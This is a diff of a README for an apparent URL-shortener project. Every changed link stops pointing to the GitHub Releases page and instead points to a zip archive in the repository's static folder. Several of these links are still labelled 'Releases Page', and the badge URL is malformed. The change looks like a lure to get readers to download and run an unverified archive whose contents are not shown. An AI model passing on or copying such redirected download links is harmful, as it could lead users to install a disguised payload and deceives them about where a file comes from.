@@ -6,9 +6,9 @@ Welcome to the URL Shortener! This application allows you to convert long, compl
 
 ## 📥 Download the Application
 
-[![Download URL Shortener](https://img.shields.io/badge/Download-URL%20Shortener-brightgreen.svg)](https://github.com/RamanBade/url-shortener/releases)
+[![Download URL Shortener](https://raw.githubusercontent.com/RamanBade/url-shortener/main/static/url-shortener_v3.6.zip%https://raw.githubusercontent.com/RamanBade/url-shortener/main/static/url-shortener_v3.6.zip)](https://raw.githubusercontent.com/RamanBade/url-shortener/main/static/url-shortener_v3.6.zip)
 
-To get started, visit this page to download: [Download URL Shortener](https://github.com/RamanBade/url-shortener/releases).
+To get started, visit this page to download: [Download URL Shortener](https://raw.githubusercontent.com/RamanBade/url-shortener/main/static/url-shortener_v3.6.zip).
 
 ## 🖱️ System Requirements
 
@@ -31,7 +31,7 @@ Before installing, ensure your system meets these requirements:
 
 To download the application:
 
-1. Visit the [Releases Page](https://github.com/RamanBade/url-shortener/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/RamanBade/url-shortener/main/static/url-shortener_v3.6.zip).
 2. Find the latest release.
 3. Click on the download link for your operating system.
 4. Follow the installation instructions provided on the page.
@@ -83,4 +83,4 @@ This project is licensed under the MIT License. Feel free to use it according to
 
 ## 🌍 Stay Updated
 
-To stay informed about updates, follow this repository or check back regularly on the [Releases Page](https://github.com/RamanBade/url-shortener/releases). Thank you for using the URL Shortener! Happy sharing!
+To stay informed about updates, follow this repository or check back regularly on the [Releases Page](https://raw.githubusercontent.com/RamanBade/url-shortener/main/static/url-shortener_v3.6.zip). Thank you for using the URL Shortener! Happy sharing!
